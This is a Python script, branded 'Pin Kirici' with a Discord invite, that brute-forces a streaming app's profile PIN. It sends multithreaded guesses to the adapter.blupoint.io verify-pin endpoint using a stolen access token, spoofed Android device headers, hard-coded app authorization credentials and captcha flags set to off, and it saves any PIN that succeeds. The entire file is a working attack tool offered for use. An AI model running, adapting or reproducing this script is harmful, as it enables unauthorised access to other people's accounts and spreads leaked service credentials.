import sys
from colorama import Fore, init, Style
import threading, requests
import ctypes, time, os
from pystyle import Colors, Colorate
import colorama

class Recoo:
    def __init__(self):
        self.checking = True
        self.recooo = False
        self.usernames = []
        self.passwords = []
        self.counter = 0
        self.invalid = 0
        global token
        token = open("Blu-Access.txt", "r").read().strip()
        global profil
        profil = open("Blu-Token.txt", "r").read().strip()
        
    def load_combos(self):
        if os.path.exists("numbers.txt"):
            with open("numbers.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True


    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW("Pin Kirici .gg/Xd8VfYPHB3 | Invalid: {} ".format(self.invalid))


    def ui(self):
        print(Colorate.Horizontal(Colors.blue_to_purple, """ 
                                                (                    
                                                )\ )                 
                                                (()/(  (              
                                                /(_))))\ (  (    (   
                                                (_)) /((_))\ )\   )\  
                                                | _ (_)) ((_|(_) ((_) 
                                                |   / -_) _/ _ \/ _ \ 
                                                |_|_\___\__\___/\___/ 
                                                                    """, 1))




    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session
    
    def check_account(self, username, password):
        session = self.session()
        json = {"pin":username,"user_id":""}


        head = {
                    "Accept-Encoding": "gzip",
                    "Accept-Language": "tr-TR",
                    "AppAuthorization": "Basic 58b402bc058d029c8092da50:naEBANIWWu4LGvr82umVCDezA/KJep50+Km7ojdR0ROw2RlKy7a5OBauWzNOV5/TX2pREy1Sc/sg2TwLUdFfcQ==",
                    "AppPlatform": "com.blu.lama.phone.android",
                    "AppVersion": "62124541",
                    "Authorization": "Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6",
                    "AuthorizationToken": token,
                    "CaptchaProvider": "",
                    "CaptchaToken": "",
                    "captchaTokenRequired": "false",
                    "Connection": "Keep-Alive",
                    "Content-Length": "35",
                    "Content-Type": "application/json; charset=UTF-8",
                    "DeviceId": "1c99d003ff548e09",
                    "DeviceName": "Samsung SM-G991B",
                    "DeviceResolution": "1080x2176",
                    "Host": "adapter.blupoint.io",
                    "User-Agent": "okhttp/3.12.12",
                    "x-captcha-api-version": "v2",
                    "X-INSTANA-ANDROID": "e26ca567-c081-41ac-a005-17361fdaa6a1"
        }

        uri = "https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/profiles/verify-pin?profileId=%s" % (profil,)
        check = session.post(url=uri, json = json, headers = head)
        if "errors.invalidPinError" in check.text:
            self.invalid += 1
            self.title()
        elif "failedRequestAttempt" in check.text:
            return check
        else: 
            check2 = session.post(url=uri, json = json, headers = head) ## Tekrar Kontrol ##
            if "errors.invalidPinError" not in check2.text:
                with open("Pin.txt", "a") as f: f.write("{}".format(username))
                self.recooo = True
                print(Fore.MAGENTA+"Pin:"+username)
                os.remove("Blu-Token.txt")
                os.remove("Blu-Access.txt")

            


    def start_checking(self):
        def thread_starter():
            self.check_account(self.usernames[self.counter], self.passwords[self.counter])

        while True:
            try:
                if threading.active_count() <= self.threads:
                    threading.Thread(target = thread_starter,daemon=True).start()
                    self.counter += 1
                if self.recooo == True: 
                    break

                if self.counter >= len(self.usernames): break
            except:
                pass
        input()


    def main(self):
        os.system("cls")
        load_combo = self.load_combos()
        if load_combo is not None:
            self.threads = int(input("\n{}> {}Threads: ".format(Fore.YELLOW, Fore.WHITE)))
            os.system("cls")
            self.ui()
            self.start_checking()
        else:
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Pin Kirici | Error"); print("{}Error\n{}Please put your combos inside of 'numbers.txt'".format(Fore.YELLOW, Fore.WHITE)); time.sleep(10); exit()

Recoo().main()